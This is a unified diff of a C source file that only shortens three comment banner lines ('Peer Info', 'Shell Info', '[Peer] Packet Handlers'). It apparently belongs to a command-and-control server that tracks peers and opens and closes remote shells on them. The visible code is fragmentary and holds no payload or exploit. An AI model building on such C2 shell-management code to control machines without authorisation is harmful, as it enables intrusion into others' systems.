@@ -4,7 +4,7 @@
 #include "cpeer.h"
 #include "lerror.h"
 
-/* ===============================================[[ Peer Info ]]================================================ */
+/* =======================================[[ Peer Info ]]======================================= */
 
 struct sLaika_peerInfo *allocBasePeerInfo(struct sLaika_cnc *cnc, size_t sz) {
     struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo*)laikaM_malloc(sz);
@@ -40,7 +40,7 @@ void laikaC_freePeerInfo(struct sLaika_peer *peer, struct sLaika_peerInfo *pInfo
 }
 
 
-/* ==============================================[[ Shell Info ]]================================================ */
+/* ======================================[[ Shell Info ]]======================================= */
 
 int findOpenShellID(struct sLaika_peerInfo *pInfo) {
     int id;
@@ -116,7 +116,7 @@ void laikaC_closeShells(struct sLaika_peer *peer) {
     }
 }
 
-/* ========================================[[ [Peer] Packet Handlers ]]========================================== */
+/* ================================[[ [Peer] Packet Handlers ]]================================= */
 
 void laikaC_handleShellClose(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData) {
     struct sLaika_peerInfo *pInfo = (struct sLaika_peerInfo*)uData;
